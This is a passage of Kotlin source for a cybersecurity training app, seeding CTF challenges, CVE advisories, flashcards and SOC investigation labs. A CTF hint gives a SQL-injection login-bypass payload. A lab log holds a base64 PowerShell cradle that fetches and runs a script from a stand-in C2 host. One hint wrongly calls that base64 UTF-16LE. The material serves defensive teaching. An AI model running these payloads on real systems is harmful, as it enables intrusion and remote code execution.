  val ctfChallenges: List<CtfChallenge> = listOf(
    CtfChallenge(
      id = "ctf_01",
      title = "Operation Obfuscated Byte",
      category = "Forensics",
      difficulty = "Beginner",
      points = 150,
      description = "We extracted an encoded string from a memory dump of a malicious process. Decode the multi-layer encoding (Hex -> Base64 -> ROT13) to uncover the secret flag.",
      hints = listOf(
        "Level 1: Convert the ASCII hex string to plain text characters first.",
        "Level 2: The decoded text contains a Base64 string ending with ==.",
        "Level 3: Apply ROT-13 cipher to the resulting string."
      ),
      flag = "aegora{cyber_forensics_master_2026}",
      isSolved = true
    ),
    CtfChallenge(
      id = "ctf_02",
      title = "SQLi Auth Bypass Lab",
      category = "Web Security",
      difficulty = "Intermediate",
      points = 250,
      description = "The target login portal contains a classic string interpolation vulnerability in the password authentication query: SELECT * FROM users WHERE user = 'USER' AND pass = 'PASS'. Craft the payload to authenticate as administrator.",
      hints = listOf(
        "Level 1: What SQL operator allows a condition to always evaluate to TRUE?",
        "Level 2: Comment out the remainder of the query using `--` or `#`.",
        "Level 3: Try payload in username: `admin' OR '1'='1' --`"
      ),
      flag = "aegora{sqli_injection_zero_trust}",
      isSolved = false
    )
  )

  // Project Blueprints for Portfolio
  val projectBlueprints: List<ProjectBlueprint> = listOf(
    ProjectBlueprint(
      id = "prj_01",
      title = "Mini Enterprise SOC: Centralized Wazuh + Sysmon Detection Lab",
      difficulty = "Intermediate",
      estimatedWeeks = 3,
      architectureSummary = "A complete multi-VM detection engineering environment. Ingests Windows & Linux audit logs into Wazuh Manager, correlates alerts against MITRE ATT&CK, and triggers automated active response scripts.",
      keyComponents = listOf("Wazuh SIEM Manager & Indexer", "Sysmon Modular XML Config", "Suricata NIDS", "Elasticsearch & Kibana Dashboards", "Automated Telegram / Slack Alert Webhook"),
      githubStructure = listOf("README.md", "wazuh-rules/custom_sysmon_rules.xml", "sysmon/sysmonconfig.xml", "scripts/log_generator.py", "dashboards/mitre_overview.json"),
      resumeBulletPoints = listOf(
        "Architected an enterprise-grade virtual SOC lab utilizing Wazuh, Sysmon, and Suricata to monitor 5 endpoints across Windows/Linux domains.",
        "Authored 25+ custom Sigma and XML detection rules mapped to MITRE ATT&CK techniques, detecting privilege escalation with 98% accuracy.",
        "Implemented automated endpoint isolation scripts triggered via Wazuh Active Response on high-severity ransomware behavior."
      ),
      skillsDemonstrated = listOf("SIEM Architecture", "Detection Engineering", "Sysmon Configuration", "Incident Response Automation", "MITRE ATT&CK")
    ),
    ProjectBlueprint(
      id = "prj_02",
      title = "Automated Cloud Incident Response Bot (AWS Lambda + GuardDuty)",
      difficulty = "Advanced",
      estimatedWeeks = 4,
      architectureSummary = "Serverless incident response pipeline. Listens to Amazon GuardDuty findings via EventBridge, analyzes suspicious IAM privilege escalation attempts, and automatically revokes compromised session tokens.",
      keyComponents = listOf("AWS GuardDuty", "AWS EventBridge", "Python AWS Lambda Handler", "AWS IAM Policy Quarantine", "SES Incident Email Dispatcher"),
      githubStructure = listOf("README.md", "terraform/main.tf", "lambda/quarantine_handler.py", "tests/simulate_finding.json", "docs/architecture.png"),
      resumeBulletPoints = listOf(
        "Developed serverless automated incident response pipeline reducing Mean Time to Remediate (MTTR) for compromised IAM credentials to < 3 seconds.",
        "Utilized Terraform to deploy infrastructure-as-code with strict principle of least privilege across multi-account AWS organization.",
        "Integrated automated digital forensics artifact snapshotting of EBS volumes upon detection of cryptocurrency mining findings."
      ),
      skillsDemonstrated = listOf("AWS Security", "Serverless IR", "Terraform IaC", "Python Boto3", "IAM Least Privilege")
    )
  )

  // Threat Intelligence Advisories
  val threatAdvisories: List<ThreatAdvisory> = listOf(
    ThreatAdvisory(
      id = "cve_2024_3094",
      cveId = "CVE-2024-3094",
      title = "XZ Utils Embedded SSH Backdoor Vulnerability",
      severity = "Critical",
      cvssScore = 10.0f,
      affectedSystems = "XZ Utils 5.6.0 & 5.6.1 (Debian unstable, Fedora 40/Rawhide, Arch Linux)",
      summary = "A sophisticated multi-year supply chain attack inserted an obfuscated backdoor into upstream release tarballs of XZ Utils, modifying liblzma during build to intercept sshd authentication and allow unauthorized remote code execution.",
      technicalImpact = "Complete pre-authentication Remote Code Execution (RCE) with root privileges on affected OpenSSH server daemons.",
      detectionRuleSummary = "Verify installed xz version (`xz --version`). Monitor `sshd` memory hooks or abnormal library symbol lookups during RSA decryption.",
      mitigationSteps = "Downgrade xz-utils to version 5.4.x or upgrade to sanitized package 5.6.2+. Isolate exposed SSH endpoints.",
      datePublished = "2024-03-29 (Verified Security Advisory)"
    ),
    ThreatAdvisory(
      id = "cve_2023_34362",
      cveId = "CVE-2023-34362",
      title = "MOVEit Transfer SQL Injection to RCE (Clop Ransomware)",
      severity = "Critical",
      cvssScore = 9.8f,
      affectedSystems = "Progress MOVEit Transfer versions before May 2023",
      summary = "A critical SQL injection flaw in MOVEit Transfer web application allowed unauthenticated attackers to gain unauthorized database access, inject webshells (human2.aspx), and exfiltrate massive data volumes.",
      technicalImpact = "Massive data exfiltration and complete system takeover via dropped ASPX webshells.",
      detectionRuleSummary = "Search IIS web logs for requests to `guestaccess.aspx` with abnormal parameter payloads and creation of `human2.aspx` in wwwroot.",
      mitigationSteps = "Apply vendor hotfix immediately, disable external HTTP/HTTPS traffic to MOVEit until patched, audit database users.",
      datePublished = "2023-05-31 (Verified Security Advisory)"
    )
  )

  // Threat Actor Dossiers
  val threatActors: List<ThreatActorDossier> = listOf(
    ThreatActorDossier(
      id = "apt_29",
      name = "APT29 (Cozy Bear / Midnight Blizzard)",
      country = "Russia (SVR)",
      aliases = listOf("NOBELIUM", "Midnight Blizzard", "The Dukes"),
      description = "Advanced persistent threat actor focusing on intelligence gathering against government, defense, and think tank entities. Known for the SolarWinds supply chain breach and spear-phishing token abuse.",
      targetedSectors = listOf("Government", "Defense", "IT Supply Chain", "NGOs"),
      primaryTTPs = listOf("T1195.002 Supply Chain Compromise", "T1566.002 Spearphishing Link", "T1078 Valid Accounts")
    ),
    ThreatActorDossier(
      id = "clop_ransom",
      name = "Clop Ransomware Group (TA505 / FIN11)",
      country = "Eastern Europe",
      aliases = listOf("Lace Tempest", "FIN11", "TA505"),
      description = "Prolific cybercriminal extortion group specializing in mass zero-day exploitation of enterprise file transfer systems (MOVEit, GoAnywhere, Accellion FTA) followed by double-extortion data leak publishing.",
      targetedSectors = listOf("Healthcare", "Financial Services", "Higher Education", "Retail"),
      primaryTTPs = listOf("T1190 Exploit Public-Facing App", "T1567.002 Exfiltration to Cloud", "T1486 Data Encrypted for Impact")
    )
  )

  // Global Cyber Events
  val upcomingEvents: List<CyberEvent> = listOf(
    CyberEvent(
      id = "ev_01",
      title = "DEF CON 34 Security Conference",
      type = "Conference & Villages",
      organizer = "DEF CON Communications",
      date = "August 6 - 9, 2026",
      location = "Las Vegas, NV & Online",
      isFree = false,
      targetAudience = "All Cyber Practitioners, Hackers & Researchers",
      verifiedSource = "defcon.org"
    ),
    CyberEvent(
      id = "ev_02",
      title = "National Cyber League (NCL) Fall Competition",
      type = "CTF Competition",
      organizer = "Cyber Skyline",
      date = "October 16 - 18, 2026",
      location = "Online / Global Virtual",
      isFree = true,
      targetAudience = "Students, Beginners & SOC Aspirants",
      verifiedSource = "nationalcyberleague.org"
    ),
    CyberEvent(
      id = "ev_03",
      title = "Black Hat USA Briefings & Arsenal",
      type = "Conference & Research",
      organizer = "Informa Tech",
      date = "August 1 - 6, 2026",
      location = "Las Vegas, NV",
      isFree = false,
      targetAudience = "Security Executives, Engineers & Researchers",
      verifiedSource = "blackhat.com"
    )
  )
  val cyberEvents: List<CyberEvent> = upcomingEvents

  // AI Chat Conversation History
  private val _chatMessages = MutableStateFlow<List<AiChatMessage>>(
    listOf(
      AiChatMessage(
        id = "msg_init_01",
        sender = "aegora_ai",
        text = "Greetings, Sentinel. I am your AEGORA AI mentor. Currently operating in SOC Mentor Mode. I am synchronized with your journey toward SOC Analyst L1/L2. How can I assist your investigation today?",
        timestamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date()),
        mode = AiMentorMode.SOC_MENTOR,
        suggestedFollowUps = listOf(
          "How do I analyze Base64 PowerShell logs?",
          "Explain MITRE ATT&CK for Phishing",
          "Test me on Sysmon Event IDs",
          "Review my Job Readiness Score"
        )
      )
    )
  )
  val chatMessages: StateFlow<List<AiChatMessage>> = _chatMessages.asStateFlow()

  // Actions
  fun updateCareerGoal(careerId: String) {
    val updatedProfile = _userProfile.value.copy(targetCareerId = careerId)
    _userProfile.value = updatedProfile
  }

  fun updateTargetCareer(careerId: String) {
    updateCareerGoal(careerId)
  }

  fun updatePreferences(
    level: SkillLevel,
    commitment: DailyCommitment,
    timeline: TargetTimeline
  ) {
    _userProfile.value = _userProfile.value.copy(
      currentLevel = level,
      dailyCommitment = commitment,
      targetTimeline = timeline,
      isOnboarded = true
    )
  }


  fun updateOnboarding(
    careerId: String,
    level: SkillLevel,
    time: DailyCommitment,
    timeline: TargetTimeline,
    pref: LearningPreference
  ) {
    _userProfile.value = _userProfile.value.copy(
      targetCareerId = careerId,
      currentLevel = level,
      dailyCommitment = time,
      targetTimeline = timeline,
      learningPreference = pref,
      isOnboarded = true
    )
  }

  fun completeDailyMission() {
    val current = _dailyMission.value
    if (!current.isCompleted) {
      _dailyMission.value = current.copy(isCompleted = true)
      _userProfile.value = _userProfile.value.copy(
        xp = _userProfile.value.xp + current.xpReward,
        currentStreak = _userProfile.value.currentStreak + 1
      )
    }
  }

  fun addChatMessage(message: AiChatMessage) {
    _chatMessages.value = _chatMessages.value + message
  }

  fun completeLesson(lessonId: String) {
    _userProfile.value = _userProfile.value.copy(
      xp = _userProfile.value.xp + 100,
      jobReadinessScore = (_userProfile.value.jobReadinessScore + 1).coerceAtMost(98)
    )
    scheduleReviewForLesson(lessonId)
  }

  fun setUserRole(role: UserRole) {
    _userProfile.value = _userProfile.value.copy(role = role)
  }

  // ==========================================
  // Phase 2: Notes & Bookmarks State
  // ==========================================

  private val _userNotes = MutableStateFlow<List<LessonNote>>(
    listOf(
      LessonNote(
        id = "note_01",
        lessonId = "les_102",
        lessonTitle = "Sysmon Event ID 1 & Process Creation",
        domain = "Defensive Security",
        highlightedText = "Event ID 1 records process creation including ParentImage, CommandLine, and CurrentDirectory.",
        noteContent = "Crucial for tracing malware spawning cmd.exe or powershell.exe with -EncodedCommand flags from MS Office apps.",
        createdDate = "Today, 10:30 AM",
        tags = listOf("Sysmon", "Triage", "MITRE T1059")
      ),
      LessonNote(
        id = "note_02",
        lessonId = "les_101",
        lessonTitle = "DNS Tunneling & Base64 Exfiltration",
        domain = "Network Security",
        highlightedText = "Excessive TXT record lookups and entropy above 4.5 indicate tunneling.",
        noteContent = "Look for subdomains longer than 50 characters with random alphanumeric characters resolving to unfamiliar nameservers.",
        createdDate = "Yesterday, 3:15 PM",
        tags = listOf("DNS", "PCAP", "Exfiltration")
      )
    )
  )
  val userNotes: StateFlow<List<LessonNote>> = _userNotes.asStateFlow()

  private val _bookmarkedLessonIds = MutableStateFlow<Set<String>>(
    setOf("les_101", "les_102")
  )
  val bookmarkedLessonIds: StateFlow<Set<String>> = _bookmarkedLessonIds.asStateFlow()

  fun addNote(
    lessonId: String,
    lessonTitle: String,
    domain: String,
    highlightedText: String?,
    noteContent: String,
    tags: List<String> = emptyList()
  ) {
    val newNote = LessonNote(
      id = "note_${UUID.randomUUID().toString().take(8)}",
      lessonId = lessonId,
      lessonTitle = lessonTitle,
      domain = domain,
      highlightedText = highlightedText,
      noteContent = noteContent,
      createdDate = "Just now",
      tags = tags
    )
    _userNotes.value = listOf(newNote) + _userNotes.value
  }

  fun deleteNote(noteId: String) {
    _userNotes.value = _userNotes.value.filter { it.id != noteId }
  }

  fun toggleBookmark(lessonId: String) {
    val current = _bookmarkedLessonIds.value
    _bookmarkedLessonIds.value = if (current.contains(lessonId)) {
      current - lessonId
    } else {
      current + lessonId
    }
  }

  fun isBookmarked(lessonId: String): Boolean {
    return _bookmarkedLessonIds.value.contains(lessonId)
  }

  // ==========================================
  // Phase 2: Spaced Repetition Review Queue
  // ==========================================

  private val _reviewQueue = MutableStateFlow<List<FlashcardReviewItem>>(
    listOf(
      FlashcardReviewItem(
        id = "fc_01",
        lessonId = "les_102",
        lessonTitle = "Sysmon Event ID 1 & Process Creation",
        domain = "Defensive Security",
        question = "Which Sysmon Event ID records Process Creation telemetry including full Command Line parameters?",
        answer = "Sysmon Event ID 1",
        detailedExplanation = "Event ID 1 captures detailed process creation facts: ParentImage, CommandLine, ProcessGuid, Hashes (MD5/SHA256), and User context.",
        intervalDays = 1,
        repetitionLevel = 1,
        nextReviewDate = "Due Today",
        isDue = true
      ),
      FlashcardReviewItem(
        id = "fc_02",
        lessonId = "les_101",
        lessonTitle = "DNS Telemetry & Tunneling",
        domain = "Network Security",
        question = "What DNS Record type is most frequently abused by attackers for high-throughput C2 data exfiltration?",
        answer = "TXT Records (or Null/CNAME)",
        detailedExplanation = "TXT records allow arbitrary binary or text payloads up to 64KB, allowing attackers to tunnel data through recursive resolvers without direct outbound TCP connections.",
        intervalDays = 3,
        repetitionLevel = 2,
        nextReviewDate = "Due Today",
        isDue = true
      ),
      FlashcardReviewItem(
        id = "fc_03",
        lessonId = "les_201",
        lessonTitle = "AWS IAM Least Privilege & S3 Bucket Hardening",
        domain = "Cloud Security",
        question = "Which AWS IAM policy element explicitly denies access regardless of other allow statements?",
        answer = "\"Effect\": \"Deny\"",
        detailedExplanation = "In AWS IAM evaluation logic, an explicit Deny ALWAYS overrides any number of Allow permissions across Identity and Resource-based policies.",
        intervalDays = 7,
        repetitionLevel = 3,
        nextReviewDate = "Due in 4 days",
        isDue = false
      )
    )
  )
  val reviewQueue: StateFlow<List<FlashcardReviewItem>> = _reviewQueue.asStateFlow()

  fun recordReviewResult(cardId: String, isCorrect: Boolean) {
    val current = _reviewQueue.value
    _reviewQueue.value = current.map { card ->
      if (card.id == cardId) {
        if (isCorrect) {
          val nextLevel = card.repetitionLevel + 1
          val nextInterval = when (nextLevel) {
            2 -> 3
            3 -> 7
            4 -> 14
            else -> 30
          }
          card.copy(
            repetitionLevel = nextLevel,
            intervalDays = nextInterval,
            nextReviewDate = "Due in $nextInterval days",
            isDue = false
          )
        } else {
          // Reset to Day 1 on mistake
          card.copy(
            repetitionLevel = 1,
            intervalDays = 1,
            nextReviewDate = "Due Tomorrow",
            isDue = false
          )
        }
      } else {
        card
      }
    }
    _userProfile.value = _userProfile.value.copy(
      xp = _userProfile.value.xp + (if (isCorrect) 50 else 10)
    )
  }

  fun scheduleReviewForLesson(lessonId: String) {
    val lesson = lessons.find { it.id == lessonId } ?: return
    val existing = _reviewQueue.value.find { it.lessonId == lessonId }
    if (existing == null) {
      val newCard = FlashcardReviewItem(
        id = "fc_${UUID.randomUUID().toString().take(8)}",
        lessonId = lesson.id,
        lessonTitle = lesson.title,
        domain = lesson.moduleTitle,
        question = "Core Takeaway: ${lesson.keyTakeaways.firstOrNull() ?: lesson.title}",
        answer = lesson.simplifiedAnalogy.ifBlank { lesson.coreExplanation.take(120) },
        detailedExplanation = lesson.deepDiveTechnical.take(200),
        intervalDays = 1,
        repetitionLevel = 1,
        nextReviewDate = "Due Tomorrow",
        isDue = false
      )
      _reviewQueue.value = _reviewQueue.value + newCard
    }
  }

  // ==========================================
  // Phase 4: Investigation Labs Catalog & Execution
  // ==========================================

  val investigationLabs: List<InvestigationLab> = listOf(
    InvestigationLab(
      id = "lab_suspicious_login",
      title = "Investigate a Suspicious Login",
      category = "SOC",
      difficulty = "Beginner",
      estimatedTimeMinutes = 20,
      objective = "Analyze authentication logs, detect brute-force password spraying and impossible-travel login anomalies across geographic regions.",
      prerequisites = listOf("Authentication Protocols", "IP & GeoIP Basics", "Windows Event ID 4625/4624"),
      targetDomain = "Defensive Security",
      timelineEvents = listOf(
        InvestigationTimelineEvent(
          id = "tl_01",
          timestamp = "2026-08-25 08:14:02 UTC",
          eventType = "FAILED_LOGIN (Event ID 4625)",
          sourceHost = "DC-PRIMARY-01",
          processOrUser = "User: j.smith | Source IP: 198.51.100.12 (Moscow, RU)",
          summary = "Logon Failure: Bad password submitted for user j.smith. Attempt 1/8.",
          rawLog = "EventID=4625 Status=0xC000006A User=j.smith SrcIP=198.51.100.12 Workstation=WIN-WORK-99 LogonType=3",
          isSuspicious = true
        ),
        InvestigationTimelineEvent(
          id = "tl_02",
          timestamp = "2026-08-25 08:14:15 UTC",
          eventType = "FAILED_LOGIN (Event ID 4625)",
          sourceHost = "DC-PRIMARY-01",
          processOrUser = "User: j.smith | Source IP: 198.51.100.12 (Moscow, RU)",
          summary = "Logon Failure: Bad password submitted for user j.smith. Attempt 5/8 in rapid succession.",
          rawLog = "EventID=4625 Status=0xC000006A User=j.smith SrcIP=198.51.100.12 Workstation=WIN-WORK-99 LogonType=3",
          isSuspicious = true
        ),
        InvestigationTimelineEvent(
          id = "tl_03",
          timestamp = "2026-08-25 08:15:40 UTC",
          eventType = "SUCCESS_LOGIN (Event ID 4624)",
          sourceHost = "DC-PRIMARY-01",
          processOrUser = "User: j.smith | Source IP: 198.51.100.12 (Moscow, RU)",
          summary = "Logon Success: Password accepted for j.smith following rapid failures.",
          rawLog = "EventID=4624 Status=0x0 User=j.smith SrcIP=198.51.100.12 Workstation=WIN-WORK-99 LogonType=3 AuthPackage=NTLM",
          isSuspicious = true
        ),
        InvestigationTimelineEvent(
          id = "tl_04",
          timestamp = "2026-08-25 08:22:10 UTC",
          eventType = "SUCCESS_LOGIN (Event ID 4624)",
          sourceHost = "VPN-GATEWAY-US",
          processOrUser = "User: j.smith | Source IP: 73.189.44.10 (Austin, Texas, US)",
          summary = "Logon Success: Legitimate corporate VPN login from assigned employee home location.",
          rawLog = "EventID=4624 Status=0x0 User=j.smith SrcIP=73.189.44.10 Device=CiscoAnyConnect LogonType=2",
          isSuspicious = false
        )
      ),
      questions = listOf(
        InvestigationQuestion(
          id = "q_login_1",
          stepNumber = 1,
          questionText = "Based on the authentication logs, what type of adversary initial access activity occurred prior to 08:15:40 UTC?",
          isMultipleChoice = true,
          options = listOf(
            "Adversary Brute-force / Credential Stuffing from IP 198.51.100.12",
            "Routine password change by the legitimate employee",
            "DDoS attack targeting the domain controller",
            "Scheduled Kerberos ticket renewal"
          ),
          correctOptionIndex = 0,
          hints = ProgressiveHints(
            hint1Conceptual = "Examine the repeated Event ID 4625 failure events before the single 4624 success.",
            hint2Evidence = "Look at IP 198.51.100.12 sending repeated bad password requests in under 90 seconds.",
            hint3Direction = "Multiple rapid logon failures leading to a successful authentication is indicative of automated brute forcing.",
            fullExplanation = "The attacker used automated credential testing against j.smith's account from external IP 198.51.100.12 until achieving a valid login at 08:15:40 UTC."
          )
        ),
        InvestigationQuestion(
          id = "q_login_2",
          stepNumber = 2,
          questionText = "Why does the login at 08:22:10 UTC from Austin, Texas create an 'Impossible Travel' detection alert?",
          isMultipleChoice = true,
          options = listOf(
            "It is physically impossible to travel between Moscow and Austin, Texas within 7 minutes",
            "Austin IP addresses are universally blacklisted",
            "VPN logins are forbidden during morning hours",
            "The user was using an obsolete browser"
          ),
          correctOptionIndex = 0,
          hints = ProgressiveHints(
            hint1Conceptual = "Compare the timestamps and geographic coordinates of the two successful logins.",
            hint2Evidence = "Moscow at 08:15 UTC vs Austin at 08:22 UTC is a delta of only 7 minutes across ~9,000 km.",
            hint3Direction = "Calculate distance over time: traveling across the Atlantic in 7 minutes violates physical constraints.",
            fullExplanation = "Impossible Travel occurs when sequential authentications for the same identity originate from distant geographic regions faster than commercial aircraft speed."
          )
        ),
        InvestigationQuestion(
          id = "q_login_3",
          stepNumber = 3,
          questionText = "What immediate SOC containment action should be taken for user account 'j.smith'?",
          isMultipleChoice = true,
          options = listOf(
            "Revoke active sessions, disable account/force password reset, and isolate IP 198.51.100.12",
            "Ignore the alert until the end of the business day",
            "Reboot the Domain Controller",
            "Delete the user mailbox permanently"
          ),
          correctOptionIndex = 0,
          hints = ProgressiveHints(
            hint1Conceptual = "Think about identity containment following confirmed account compromise.",
            hint2Evidence = "The Moscow session is active and authenticated under valid credentials.",
            hint3Direction = "Kill active refresh tokens and block the malicious external source IP at the firewall.",
            fullExplanation = "Revoking active OAuth/Kerberos session tokens, triggering an immediate credential reset with MFA requirement, and blacklisting the attacker IP prevents further lateral movement."
          )
        )
      )
    ),
    InvestigationLab(
      id = "lab_suspicious_powershell",
      title = "Investigate Suspicious PowerShell Activity",
      category = "DFIR",
      difficulty = "Intermediate",
      estimatedTimeMinutes = 25,
      objective = "Inspect endpoint process creation telemetry, decode obfuscated Base64 payloads, and identify scheduled task persistence.",
      prerequisites = listOf("Sysmon Event IDs", "Base64 & Script Deobfuscation", "MITRE ATT&CK T1059 / T1053"),
      targetDomain = "Forensics & Response",
      timelineEvents = listOf(
        InvestigationTimelineEvent(
          id = "tl_ps_01",
          timestamp = "2026-08-25 14:02:11 UTC",
          eventType = "PROCESS_CREATE (Sysmon 1)",
          sourceHost = "WIN-FINANCE-04",
          processOrUser = "Parent: WINWORD.EXE (PID 4812)",
          summary = "WINWORD.EXE spawned cmd.exe with suspicious subshell call.",
          rawLog = "EventID=1 ParentImage=C:\\Program Files\\Microsoft Office\\WINWORD.EXE Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c start powershell.exe",
          isSuspicious = true
        ),
        InvestigationTimelineEvent(
          id = "tl_ps_02",
          timestamp = "2026-08-25 14:02:13 UTC",
          eventType = "PROCESS_CREATE (Sysmon 1)",
          sourceHost = "WIN-FINANCE-04",
          processOrUser = "Image: powershell.exe (PID 6012)",
          summary = "PowerShell executed with -NonI -W Hidden -Enc Base64 encoded payload.",
          rawLog = "CommandLine=powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2F0dGFjay1jMi5pby9zdGFnZTIucHMxJyk=",
          isSuspicious = true
        ),
        InvestigationTimelineEvent(
          id = "tl_ps_03",
          timestamp = "2026-08-25 14:02:18 UTC",
          eventType = "NETWORK_CONNECT (Sysmon 3)",
          sourceHost = "WIN-FINANCE-04",
          processOrUser = "Image: powershell.exe (PID 6012)",
          summary = "Outbound HTTPS connection to 198.51.100.44:8443 (C2 Server).",
          rawLog = "EventID=3 Image=powershell.exe DestinationIp=198.51.100.44 DestinationPort=8443 Protocol=tcp",
          isSuspicious = true
        ),
        InvestigationTimelineEvent(
          id = "tl_ps_04",
          timestamp = "2026-08-25 14:03:00 UTC",
          eventType = "TASK_REGISTER (Event ID 4698)",
          sourceHost = "WIN-FINANCE-04",
          processOrUser = "User: SYSTEM | Task: \\Microsoft\\Windows\\UpdateCheck",
          summary = "A scheduled task was created pointing to downloaded stage2 payload for persistence.",
          rawLog = "EventID=4698 TaskName=\\Microsoft\\Windows\\UpdateCheck Action=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\update.ps1",
          isSuspicious = true
        )
      ),
      questions = listOf(
        InvestigationQuestion(
          id = "q_ps_1",
          stepNumber = 1,
          questionText = "Decoding the Base64 parameter reveals what command executed by PowerShell?",
          isMultipleChoice = true,
          options = listOf(
            "IEX (New-Object Net.WebClient).DownloadString('https://attack-c2.io/stage2.ps1')",
            "Get-Process | Where-Object { \$_.CPU -gt 100 }",
            "Restart-Computer -Force",
            "Get-EventLog -LogName Security -Newest 10"
          ),
          correctOptionIndex = 0,
          hints = ProgressiveHints(
            hint1Conceptual = "The Base64 string represents UTF-16LE encoded Unicode string used by Windows PowerShell.",
            hint2Evidence = "SUVYA... decodes to IEX (Invoke-Expression) downloading an external payload via HTTP/S.",
            hint3Direction = "Invoke-Expression downloads stage2.ps1 directly into volatile memory (fileless execution).",
            fullExplanation = "The encoded payload uses WebClient to pull stage2.ps1 directly from the C2 infrastructure https://attack-c2.io."
          )
        ),
        InvestigationQuestion(
          id = "q_ps_2",
          stepNumber = 2,
          questionText = "Which MITRE ATT&CK Persistence technique was established at 14:03:00 UTC?",
          isMultipleChoice = true,
          options = listOf(
            "T1053.005 Scheduled Task/Job: Scheduled Task",
            "T1547.001 Registry Run Keys / Startup Folder",
            "T1136 Create Account",
            "T1543 Create or Modify System Process"
          ),
          correctOptionIndex = 0,
          hints = ProgressiveHints(
            hint1Conceptual = "Review Event ID 4698 recorded at 14:03:00 UTC.",
            hint2Evidence = "TaskName=\\Microsoft\\Windows\\UpdateCheck disguised as a legitimate Windows update.",
            hint3Direction = "Scheduled tasks are mapped to MITRE ATT&CK T1053.005.",
            fullExplanation = "Adversaries create scheduled tasks with deceptive names (e.g. \\UpdateCheck) to maintain persistence across system reboots."
          )
        )
      )
    )
  )

  fun completeInvestigationLab(labId: String, scorecard: LabScorecard) {
    _userProfile.value = _userProfile.value.copy(
      xp = _userProfile.value.xp + scorecard.xpAwarded,
      completedLabsCount = _userProfile.value.completedLabsCount + 1,
      jobReadinessScore = (_userProfile.value.jobReadinessScore + 2).coerceAtMost(98)
    )
  }

  // ==========================================
  // Phase 9: Community Topic Rooms State
  // ==========================================

  private val _communityPosts = MutableStateFlow<List<CommunityPost>>(
    listOf(
      CommunityPost(
        id = "post_01",
        roomCategory = "SOC",
        title = "How do you handle high volume false positives on Sysmon Event ID 1 in enterprise?",
        body = "We recently deployed Sysmon across 2,000 endpoints and our SIEM ingestion spiked due to routine Chrome and Teams helper updates. Any recommended filtering templates or exclusion rule strategies?",
        authorName = "Elena Rostova",
        authorCallsign = "BLUE-DEFENDER",
        isVerifiedBadge = true,
        timestamp = "2 hours ago",
        upvotes = 24,
        replies = listOf(
          CommunityReply(
            id = "rep_01",
            authorName = "Marcus Brody",
            authorCallsign = "CYBER-LEAD",
            isVerifiedBadge = true,
            body = "Use SwiftOnSecurity's baseline sysmonconfig as a starting point. Make sure you filter on ParentImage + Image pairings with signed hash verification rather than broad commandline string matching.",
            timestamp = "1 hour ago"
          ),
          CommunityReply(
            id = "rep_02",
            authorName = "Alex Vance",
            authorCallsign = "VANCE-SOC",
            isVerifiedBadge = false,
            body = "We also added dedicated exclusions for verified software deployment folders and SCCM execution paths which cut our alert noise by 65%.",
            timestamp = "45 mins ago"
          )
        )
      ),
      CommunityPost(
        id = "post_02",
        roomCategory = "CTF",
        title = "Stuck on Memory Forensics artifact carving challenge — tips for Volatility 3?",
        body = "Working through the Aegora DFIR arena on the malicious DLL injection module. `windows.pslist` shows suspicious PID 3412 but `windows.malfind` is returning false positives on JIT memory. Any pointers?",
        authorName = "Kavita Patel",
        authorCallsign = "HEX-HUNTER",
        isVerifiedBadge = false,
        timestamp = "4 hours ago",
        upvotes = 18,
        replies = listOf(
          CommunityReply(
            id = "rep_03",
            authorName = "David Chen",
            authorCallsign = "DFIR-PRO",
            isVerifiedBadge = true,
            body = "Try `windows.dlllist --pid 3412` and cross-reference with `windows.netscan` to see if that process established an outbound socket at the exact timestamp of injection.",
            timestamp = "3 hours ago"
          )
        )
      ),
      CommunityPost(
        id = "post_03",
        roomCategory = "Career",
        title = "Transitioning from IT Helpdesk to L1 SOC Analyst — 6 month roadmap reflections",
        body = "Just cleared CompTIA Security+ and finished 8 Aegora investigation labs. Documenting my home lab builds (Splunk + Zeek) on GitHub made a huge difference during technical screening interviews!",
        authorName = "Jordan Hayes",
        authorCallsign = "SENTINEL-X",
        isVerifiedBadge = true,
        timestamp = "Yesterday",
        upvotes = 52,
        replies = listOf(
          CommunityReply(
            id = "rep_04",
            authorName = "Aegora Career Mentor",
            authorCallsign = "AEGORA-STAFF",
            isVerifiedBadge = true,
            body = "Congratulations Jordan! Your Skill Passport evidence ledger with verified hash artifacts is a standout portfolio builder.",
            timestamp = "18 hours ago"
          )
        )
      )
    )
  )
  val communityPosts: StateFlow<List<CommunityPost>> = _communityPosts.asStateFlow()

  fun createCommunityPost(roomCategory: String, title: String, body: String) {
    // Client-side simple profanity / abuse keyword filter
    val blockedKeywords = listOf("malware_download_link", "ddos_attack_tool", "illegal_hack")
    if (blockedKeywords.any { body.lowercase().contains(it) || title.lowercase().contains(it) }) {
      return
    }

    val user = _userProfile.value
    val newPost = CommunityPost(
      id = "post_${UUID.randomUUID().toString().take(8)}",
      roomCategory = roomCategory,
      title = title,
      body = body,
      authorName = user.name,
      authorCallsign = user.callsign,
      isVerifiedBadge = user.verifiedSkillCount > 10,
      timestamp = "Just now",
      upvotes = 1,
      replies = emptyList(),
      isReported = false
    )
    _communityPosts.value = listOf(newPost) + _communityPosts.value
    _userProfile.value = user.copy(xp = user.xp + 25)
  }

  fun addCommunityReply(postId: String, body: String) {
    val user = _userProfile.value
    val newReply = CommunityReply(
      id = "rep_${UUID.randomUUID().toString().take(8)}",
      authorName = user.name,
      authorCallsign = user.callsign,
      isVerifiedBadge = user.verifiedSkillCount > 10,
      body = body,
      timestamp = "Just now"
    )

    _communityPosts.value = _communityPosts.value.map { post ->
      if (post.id == postId) {
        post.copy(replies = post.replies + newReply)
      } else {
        post
      }
    }
  }

  fun upvoteCommunityPost(postId: String) {
    _communityPosts.value = _communityPosts.value.map { post ->
      if (post.id == postId) {
        post.copy(upvotes = post.upvotes + 1)
      } else {
        post
      }
    }
  }

  fun reportCommunityPost(postId: String) {
    _communityPosts.value = _communityPosts.value.map { post ->
      if (post.id == postId) {
        post.copy(isReported = true)
      } else {
        post
      }
    }
  }

  // ==========================================
  // Phase 10: University Mode & Admin Scaffolding
  // ==========================================

  private val _classrooms = MutableStateFlow<List<ClassroomRoster>>(
    listOf(
      ClassroomRoster(
        id = "class_cs450_fall26",
        name = "CS 450: Applied Cyber Defense & SOC Ops",
        instructorName = "Prof. Ronald Vance",
        assignedLessonIds = listOf("les_101", "les_102", "les_201"),
